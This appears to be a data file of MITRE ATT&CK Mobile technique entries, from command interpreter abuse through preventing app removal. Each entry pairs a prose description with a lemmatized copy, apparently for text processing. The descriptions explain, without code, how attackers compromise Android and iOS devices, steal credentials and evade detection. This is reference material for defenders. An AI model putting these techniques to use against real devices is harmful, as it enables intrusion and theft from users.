T1623,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, Android is a UNIX-like OS and includes a basic Unix Shell that can be accessed via the Android Debug Bridge (ADB) or Java’s Runtime package.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",adversary abuse command script interpreter execute command script binary interface language provide way interact computer system common feature different platform system come build command line interface scripting capability example android unix like os include basic unix shell access android debug bridge adb java runtime package adversary abuse technology way means execute arbitrary command command script embed initial access payload deliver victim lure document secondary payload download exist adversary execute command interactive terminal shell
T1623.001,Command and Scripting Interpreter: Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the underlying command prompts on Android and iOS devices. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges that are only accessible if the device has been rooted or jailbroken. Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence. If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.",adversary abuse unix shell command script execution unix shell underlie command prompt android ios device unix shell control aspect system certain command require elevated privilege accessible device root jailbroken unix shell support script enable sequential execution command typical programming operation conditional loop common use shell script include long repetitive task need run set command multiple system adversary abuse unix shell execute command payload interactive shell access command control channel lateral movement ssh adversary leverage shell script deliver execute multiple command victim payload persistence device root jailbroken adversary locate invoke superuser binary elevate privilege interact system root user dangerous level permission allow adversary run special command modify protect system file
T1577,Compromise Application Executable,"Adversaries may modify applications installed on a device to establish persistent access to a victim. These malicious modifications can be used to make legitimate applications carry out adversary tasks when these applications are in use.There are multiple ways an adversary can inject malicious code into applications. One method is by taking advantages of device vulnerabilities, the most well-known being Janus, an Android vulnerability that allows adversaries to add extra bytes to APK (application) and DEX (executable) files without affecting the file's signature. By being able to add arbitrary bytes to valid applications, attackers can seamlessly inject code into genuine executables without the user's knowledge.Adversaries may also rebuild applications to include malicious modifications. This can be achieved by decompiling the genuine application, merging it with the malicious code, and recompiling it.Adversaries may also take action to conceal modifications to application executables and bypass user consent. These actions include altering modifications to appear as an update or exploiting vulnerabilities that allow activities of the malicious application to run inside a system application.",adversary modify application instal device establish persistent access victim malicious modification legitimate application carry adversary task application use multiple way adversary inject malicious code application method take advantage device vulnerability know janus android vulnerability allow adversary add extra byte apk application dex executable file affect file signature able add arbitrary byte valid application attacker seamlessly inject code genuine executable user knowledge adversary rebuild application include malicious modification achieve decompile genuine application merge malicious code recompile adversary action conceal modification application executable bypass user consent action include alter modification appear update exploit vulnerability allow activity malicious application run inside system application
T1645,Compromise Client Software Binary,"Adversaries may modify system software binaries to establish persistent access to devices. System software binaries are used by the underlying operating system and users over adb or terminal emulators. Adversaries may make modifications to client software binaries to carry out malicious tasks when those binaries are executed. For example, malware may come with a pre-compiled malicious binary intended to overwrite the genuine one on the device. Since these binaries may be routinely executed by the system or user, the adversary can leverage this for persistent access to the device.",adversary modify system software binary establish persistent access device system software binary underlie operate system user adb terminal emulator adversary modification client software binary carry malicious task binary execute example malware come pre compiled malicious binary intend overwrite genuine device binary routinely execute system user adversary leverage persistent access device
T1634,Credentials from Password Store,"Adversaries may search common password storage locations to obtain user credentials. Passwords can be stored in several places on a device, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",adversary search common password storage location obtain user credential password store place device depend operate system application hold credential specific application store password easy user manage maintain credential obtain perform lateral movement access restricted information
T1634.001,Credentials from Password Store: Keychain,"Adversaries may collect keychain data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials. On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, adversaries can access the entire encrypted database.",adversary collect keychain datum ios device acquire credential keychain build way ios track user password credential service feature wi fi password website secure note certificate private key vpn credential device keychain database store outside application sandbox prevent unauthorized access raw datum standard ios api allow application access keychain contain database utilize privilege escalation exploit exist root access adversary access entire encrypted database
T1471,Data Encrypted for Impact,An adversary may encrypt files stored on a mobile device to prevent the user from accessing them. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.,adversary encrypt file store mobile device prevent user access order extract monetary compensation victim exchange decryption decryption key ransomware render datum permanently inaccessible case key save transmit
T1533,Data from Local System,"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to exfiltration. Access to local system data, which includes information stored by the operating system, often requires escalated privileges. Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos. On Android, adversaries may also attempt to access files from external storage which may require additional storage-related permissions.",adversary search local system source file system local database find file interest sensitive datum prior exfiltration access local system datum include information store operate system require escalate privilege example local system datum include authentication token device keyboard cache wi fi password photo android adversary attempt access file external storage require additional storage relate permission
T1641,Data Manipulation,"Adversaries may insert, delete, or alter data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application, process, and the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.",adversary insert delete alter datum order manipulate external outcome hide activity manipulate datum adversary attempt affect business process organizational understanding decision making type modification impact depend target application process goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact
T1641.001,Data Manipulation: Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, or decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity to deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.One method to achieve Transmitted Data Manipulation is by modifying the contents of the device clipboard. Malicious applications may monitor clipboard activity through the ClipboardManager.OnPrimaryClipChangedListener interface on Android to determine when clipboard contents have changed. Listening to clipboard activity, reading clipboard contents, and modifying clipboard contents requires no explicit application permissions and can be performed by applications running in the background. However, this behavior has changed with the release of Android 10.Adversaries may use Transmitted Data Manipulation to replace text prior to being pasted. For example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.Transmitted Data Manipulation was seen within the Android/Clipper.C trojan. This sample was detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.",adversary alter datum en route storage system order manipulate external outcome hide activity manipulate transmit datum adversary attempt affect business process organizational understanding decision making manipulation possible network connection system process opportunity deploy tool intercept change information type modification impact depend target transmission mechanism goal objective adversary complex system adversary likely need special expertise possibly access specialized software relate system typically gain prolonged information gathering campaign order desire impact method achieve transmitted data manipulation modify content device clipboard malicious application monitor clipboard activity clipboardmanager onprimaryclipchangedlistener interface android determine clipboard content change listen clipboard activity read clipboard content modify clipboard content require explicit application permission perform application run background behavior change release android use transmitted data manipulation replace text prior paste example replace copy bitcoin wallet address wallet address adversarial control transmit data manipulation see android clipper c trojan sample detect eset application distribute google play store target cryptocurrency wallet number
T1407,Download New Code at Runtime,"Adversaries may download and execute dynamic code not included in the original application package after installation. This technique is primarily used to evade static analysis checks and pre-publication scans in official app stores. In some cases, more advanced dynamic or behavioral analysis techniques could detect this behavior. However, in conjunction with Execution Guardrails techniques, detecting malicious code downloaded after installation could be difficult.On Android, dynamic code could include native code, Dalvik code, or JavaScript code that utilizes Android WebView’s JavascriptInterface capability. On iOS, dynamic code could be downloaded and executed through 3rd party libraries such as JSPatch.",adversary download execute dynamic code include original application package installation technique primarily evade static analysis check pre publication scan official app store case advanced dynamic behavioral analysis technique detect behavior conjunction execution guardrails technique detect malicious code download installation difficult android dynamic code include native code dalvik code javascript code utilize android webview javascriptinterface capability ios dynamic code download execute party library jspatch
T1456,Drive-By Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring an Application Access Token.Multiple ways of delivering exploit code to a browser exist, including:A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting. Malicious ads are paid for and served through legitimate ad providers. Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",adversary gain access system user visit website normal course browsing technique user web browser typically target exploitation adversary use compromise website non exploitation behavior acquire application access token multiple way deliver exploit code browser exist include legitimate website compromise adversary inject form malicious code javascript iframe cross site scripting malicious ad pay serve legitimate ad provider build web application interface leveraged insertion kind object display web content contain script execute visit client forum post comment user controllable web website adversary visit specific community government particular industry region goal compromise specific user set user base share interest kind target attack refer strategic web compromise watering hole attack know example occur typical drive compromise process user visit website host adversary control content script automatically execute typically search version browser plugin potentially vulnerable version user require assist process enable scripting active website component ignore warning dialog box find vulnerable version exploit code deliver browser exploitation successful adversary code execution user system protection place case second visit website initial scan require exploit code deliver
T1637,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. This algorithm can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.",adversary dynamically establish connection command control infrastructure evade common detection remediation achieve malware share common algorithm infrastructure adversary use receive malware communication algorithm dynamically adjust parameter domain ip address port number malware use command control
T1637.001,Dynamic Resolution: Domain Generation Algorithms,"Adversaries may use Domain Generation Algorithms (DGAs) to procedurally generate domain names for uses such as command and control communication or malicious application distribution.DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there could potentially be thousands of domains that malware can check for instructions.",adversary use domain generation algorithms dgas procedurally generate domain name use command control communication malicious application distribution dga increase difficulty defender block track command control channel potentially thousand domain malware check instruction
T1521,Encrypted Channel,"Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",adversary explicitly employ know encryption algorithm conceal command control traffic rely inherent protection provide communication protocol despite use secure algorithm implementation vulnerable reverse engineering necessary secret key encode generate malware sample configuration file
T1521.001,Encrypted Channel: Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, Blowfish, and RC4.",adversary employ know symmetric encryption algorithm conceal command control traffic rely inherent protection provide communication protocol symmetric encryption algorithm use key plaintext encryption ciphertext decryption common symmetric encryption algorithm include aes blowfish
T1521.002,Encrypted Channel: Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private that should not be distributed. Due to how asymmetric algorithms work, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA, ElGamal, and ECDSA.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",adversary employ know asymmetric encryption algorithm conceal command control traffic rely inherent protection provide communication protocol asymmetric cryptography know public key cryptography use keypair party public freely distribute private distribute asymmetric algorithm work sender encrypt datum receiver public key receiver decrypt datum private key ensure intended recipient read encrypt datum common public key encryption algorithm include rsa elgamal efficiency protocol include ssl tls use symmetric cryptography connection establish use asymmetric cryptography establish transmit key protocol classify asymmetric cryptography
T1642,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users.On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode, preventing the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device’s passcode.On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode; they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.",adversary perform endpoint denial service dos attack degrade block availability service user android version prior app abuse device administrator access reset device lock passcode prevent user unlock device android device profile owner mdms reset device passcode ios device technique work mobile device management server remove screen lock passcode set new passcode jailbroken device malware discover lock user device
T1624,Event Triggered Execution,"Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities. Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via automatically and repeatedly executing malicious code. After gaining access to a victim’s system, adversaries may create or modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.",adversary establish persistence system mechanism trigger execution base specific event mobile operate system mean subscribe event receive sms message device boot completion device activity adversary abuse mechanism means maintain persistent access victim automatically repeatedly execute malicious code gain access victim system adversary create modify event trigger point malicious content execute event trigger invoke
T1624.001,Event Triggered Execution: Broadcast Receivers,"Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities. An intent is a message passed between Android applications or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received. In addition to Android system intents, malicious applications can register for intents broadcasted by other applications. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications. In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.",adversary establish persistence system mechanism trigger execution base specific event mobile operate system mean subscribe event receive sms message device boot completion device activity intent message pass android application system component application register receive broadcast intent runtime system wide intent deliver app certain event happen device network change user unlock screen malicious application trigger certain action app base broadcast intent receive addition android system intent malicious application register intent broadcast application allow malware respond base action application behavior typically indicate intimate knowledge potentially targeting specific device user application android api level broadcast intent behavior change limit implicit intent application register manifest case application register manifest long receive broadcast application register context specific broadcast receiver user actively app
T1627,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include environment information such as location.Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical System Checks. While use of System Checks may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",adversary use execution guardrail constrain execution action base adversary supply environment specific condition expect present target guardrail ensure payload execute intended target reduce collateral damage adversary campaign value adversary provide target system environment use guardrail include environment information location guardrail prevent exposure capability environment intend compromise operate use guardrail distinct typical system checks use system checks involve check know sandbox value continue execution match use guardrail involve check expect target specific value continue execution match
T1627.001,Execution Guardrails: Geofencing,"Adversaries may use a device’s geographical location to limit certain malicious behaviors. For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.Geofencing is accomplished by persuading the user to grant the application permission to access location services. The application can then collect, process, and exfiltrate the device’s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements. One method to accomplish Geofencing on Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location. Similar to other Geofencing methods, this requires that the user has granted the ACCESS_FINE_LOCATION and ACCESS_BACKGROUND_LOCATION permissions. The latter is only required if the application targets Android 10 (API level 29) or higher. However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime. These additional controls include ""Allow only while using the app"", which will effectively prohibit background location collection. Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing. Depending on the use case, the app will either need to call requestWhenInUseAuthorization() or requestAlwaysAuthorization(), depending on when access to the location services is required. Similar to Android, users also have the option to limit when the application can access the device’s location, including one-time use and only when the application is running in the foreground. Geofencing can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area). Other malicious usages could include showing language-specific input prompts and/or advertisements.",adversary use device geographical location limit certain malicious behavior example malware operator limit distribution second stage payload certain geographic region geofencing accomplish persuade user grant application permission access location service application collect process exfiltrate device location perform location base action cease malicious behavior show region specific advertisement method accomplish geofencing android use build geofencing api automatically trigger certain behavior device enter exit specify radius geographical location similar geofencing method require user grant permission require application target android api level high android introduce additional permission control restrict background location collection base user permission choice runtime additional control include allow app effectively prohibit background location collection similarly ios developer use build api setup execute geofencing depend use case app need requestwheninuseauthorization requestalwaysauthorization depend access location service require similar android user option limit application access device location include time use application run foreground geofencing prevent exposure capability environment intend compromise operate example location datum limit malware spread capability potentially evade application analysis environment ex malware analysis outside target geographic area malicious usage include show language specific input prompt advertisement
T1639,Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may opt to also encrypt and/or obfuscate these alternate channels.",adversary steal datum exfiltrate different protocol exist command control channel datum send alternate network location main command control server alternate protocol include ftp smtp http s dns smb network protocol main command control channel different protocol channel include web service cloud storage adversary opt encrypt obfuscate alternate channel
T1639.001,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). Adversaries may employ custom or publicly available encoding/compression algorithms (such as base64) or embed data within protocol headers and fields.",adversary steal datum exfiltrate un encrypted network protocol exist command control channel datum send alternate network location main command control server adversary opt obfuscate data use encryption network protocol natively unencrypted http ftp dns adversary employ custom publicly available encoding compression algorithm embed datum protocol header field
T1646,Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,adversary steal datum exfiltrate exist command control channel steal data encode normal communication channel protocol command control communication
T1404,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in order to to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in an application, service, within the operating system software, or kernel itself to execute adversary-controlled code. Security constructions, such as permission levels, will often hinder access to information and use of certain techniques. Adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a device, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and applications running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user- level permission to root permissions depending on the component that is vulnerable.",adversary exploit software vulnerability order elevate privilege exploitation software vulnerability occur adversary take advantage programming error application service operate system software kernel execute adversary control code security construction permission level hinder access information use certain technique adversary likely need perform privilege escalation include use software exploitation circumvent restriction initially gain access device adversary operate low privileged process prevent access certain resource system vulnerability exist usually operate system component application run high permission exploit gain high level access system enable unprivileged level permission root permission depend component vulnerable
T1428,Exploitation of Remote Services,"Adversaries may exploit remote services of enterprise servers, workstations, or other resources to gain unauthorized access to internal systems once inside of a network. Adversaries may exploit remote services by taking advantage of a mobile device’s access to an internal enterprise network through local connectivity or through a Virtual Private Network (VPN). Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods. These look for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.Depending on the permissions level of the vulnerable remote service, an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",adversary exploit remote service enterprise server workstation resource gain unauthorized access internal system inside network adversary exploit remote service take advantage mobile device access internal enterprise network local connectivity virtual private network vpn exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code common goal post compromise exploitation remote service lateral movement enable access remote system adversary need determine remote system vulnerable state network service scanning discovery method look common vulnerable software deploy network lack certain patch indicate vulnerability security software detect contain remote exploitation server likely high value target lateral movement exploitation endpoint system risk provide advantage access additional resource depend permission level vulnerable remote service adversary achieve exploitation privilege escalation result lateral movement exploitation
T1420,File and Directory Discovery,"Adversaries may enumerate files and directories or search in specific device locations for desired information within a filesystem. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including deciding if the adversary should fully infect the target and/or attempt specific actions. On Android, Linux file permissions and SELinux policies typically stringently restrict what can be accessed by apps without taking advantage of a privilege escalation exploit. The contents of the external storage directory are generally visible, which could present concerns if sensitive data is inappropriately stored there. iOS's security architecture generally restricts the ability to perform any type of File and Directory Discovery without use of escalated privileges.",adversary enumerate file directory search specific device location desire information filesystem adversary use information file directory discovery automate discovery shape follow behavior include decide adversary fully infect target attempt specific action android linux file permission selinux policy typically stringently restrict access app take advantage privilege escalation exploit content external storage directory generally visible present concern sensitive data inappropriately store ios security architecture generally restrict ability perform type file directory discovery use escalate privilege
T1541,Foreground Persistence,"Adversaries may abuse Android's startForeground() API method to maintain continuous sensor access. Beginning in Android 9, idle applications running in the background no longer have access to device sensors, such as the camera, microphone, and gyroscope.Malicious applications may abuse the startForeground() API method to continue running in the foreground, while presenting a notification to the user pretending to be a genuine application. This would allow unhindered access to the device’s sensors, assuming permission has been previously granted.Malicious applications may also abuse the startForeground() API to inform the Android system that the user is actively interacting with the application, thus preventing it from being killed by the low memory killer.",adversary abuse android startforeground api method maintain continuous sensor access begin android idle application run background long access device sensor camera microphone gyroscope malicious application abuse startforeground api method continue run foreground present notification user pretend genuine application allow unhindered access device sensor assume permission previously grant malicious application abuse startforeground api inform android system user actively interact application prevent kill low memory killer
T1643,Generate Traffic from Victim,"Adversaries may generate outbound traffic from devices. This is typically performed to manipulate external outcomes, such as to achieve carrier billing fraud or to manipulate app store rankings or ratings. Outbound traffic is typically generated as SMS messages or general web traffic, but may take other forms as well.If done via SMS messages, Android apps must hold the SEND_SMS permission. Additionally, sending an SMS message requires user consent if the recipient is a premium number. Applications cannot send SMS messages on iOS",adversary generate outbound traffic device typically perform manipulate external outcome achieve carrier billing fraud manipulate app store ranking rating outbound traffic typically generate sms message general web traffic form sms message android app hold permission additionally send sms message require user consent recipient premium number application send sms message ios
T1628,Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Mobile operating systems have features and developer APIs to hide various artifacts, such as an application’s launcher icon. These APIs have legitimate usages, such as hiding an icon to avoid application drawer clutter when an application does not have a usable interface. Adversaries may abuse these features and APIs to hide artifacts from the user to evade detection.",adversary attempt hide artifact associate behavior evade detection mobile operate system feature developer api hide artifact application launcher icon api legitimate usage hide icon avoid application drawer clutter application usable interface adversary abuse feature api hide artifact user evade detection
T1628.001,Hide Artifacts: Suppress Application Icon,"A malicious application could suppress its icon from being displayed to the user in the application launcher. This hides the fact that it is installed, and can make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions. This behavior has been seen in the BankBot/Spy Banker family of malware. Beginning in Android 10, changes were introduced to inhibit malicious applications’ ability to hide their icon. If an app is a system app, requests no permissions, or does not have a launcher activity, the application’s icon will be fully hidden. Further, if the device is fully managed or the application is in a work profile, the icon will be fully hidden. Otherwise, a synthesized activity is shown, which is a launcher icon that represents the app’s details page in the system settings. If the user clicks the synthesized activity in the launcher, they are taken to the application’s details page in the system settings.",malicious application suppress icon display user application launcher hide fact instal difficult user uninstall application hide application icon programmatically require special permission behavior see bankbot spy banker family malware begin android change introduce inhibit malicious application ability hide icon app system app request permission launcher activity application icon fully hide device fully manage application work profile icon fully hide synthesized activity show launcher icon represent app detail page system setting user click synthesize activity launcher take application detail page system setting
T1628.002,Hide Artifacts: User Evasion,"Adversaries may attempt to avoid detection by hiding malicious behavior from the user. By doing this, an adversary’s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device. While there are many ways this can be accomplished, one method is by using the device’s sensors. By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with. That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing. Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.",adversary attempt avoid detection hide malicious behavior user adversary modification likely remain instal device long allow adversary continue operate device way accomplish method device sensor utilize motion sensor device accelerometer gyroscope application detect device interact way application continue run device use cease operate user device hide indicate malicious activity ongoing access sensor way require permission user completely transparent
T1625,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur over time. There are many ways an adversary may hijack the flow of execution. A primary way is by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs or resources, such as file directories, could also be poisoned to include malicious payloads.",adversary execute malicious payload hijack way operate system run application hijack execution flow purpose persistence hijack execution reoccur time way adversary hijack flow execution primary way manipulate operate system locate program execute operate system locate library program intercept location operate system look program resource file directory poison include malicious payload
T1625.001,Hijack Execution Flow: System Runtime API Hijacking,"Adversaries may execute their own malicious payloads by hijacking the way an operating system run applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur at later points in time. On Android, adversaries may overwrite the standard OS API library with a malicious alternative to hook into core functions to achieve persistence. By doing this, the adversary’s code will be executed every time the overwritten API function is called by an app on the infected device.",adversary execute malicious payload hijack way operate system run application hijack execution flow purpose persistence hijack execution reoccur later point time android adversary overwrite standard os api library malicious alternative hook core function achieve persistence adversary code execute time overwritten api function call app infected device
T1617,Hooking,"Adversaries may utilize hooking to hide the presence of artifacts associated with their behaviors to evade detection. Hooking can be used to modify return values or data structures of system APIs and function calls. This process typically involves using 3rd party root frameworks, such as Xposed or Magisk, with either a system exploit or pre-existing root access. By including custom modules for root frameworks, adversaries can hook system APIs and alter the return value and/or system data structures to alter functionality/visibility of various aspects of the system.",adversary utilize hooking hide presence artifact associate behavior evade detection hooking modify return value data structure system api function call process typically involve party root framework xposed magisk system exploit pre existing root access include custom module root framework adversary hook system api alter return value system datum structure alter functionality visibility aspect system
T1629,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may span both native defenses as well as supplemental capabilities installed by users or mobile endpoint administrators.",adversary maliciously modify component victim environment order hinder disable defensive mechanism involve impair preventative defense anti virus detection capability defender use audit activity identify malicious behavior span native defense supplemental capability instal user mobile endpoint administrator
T1629.001,Impair Defenses: Prevent Application Removal,"Adversaries may abuse the Android device administration API to prevent the user from uninstalling a target application. In earlier versions of Android, device administrator applications needed their administration capabilities explicitly deactivated by the user before the application could be uninstalled. This was later updated so the user could deactivate and uninstall the administrator application in one step.Adversaries may also abuse the device accessibility APIs to prevent removal. This set of APIs allows the application to perform certain actions on behalf of the user and programmatically determine what is being shown on the screen. The malicious application could monitor the device screen for certain modals (e.g., the confirmation modal to uninstall an application) and inject screen input or a back button tap to close the modal.",adversary abuse android device administration api prevent user uninstalle target application early version android device administrator application need administration capability explicitly deactivate user application uninstalle later update user deactivate uninstall administrator application step adversary abuse device accessibility api prevent removal set api allow application perform certain action behalf user programmatically determine show screen malicious application monitor device screen certain modal confirmation modal uninstall application inject screen input button tap close modal
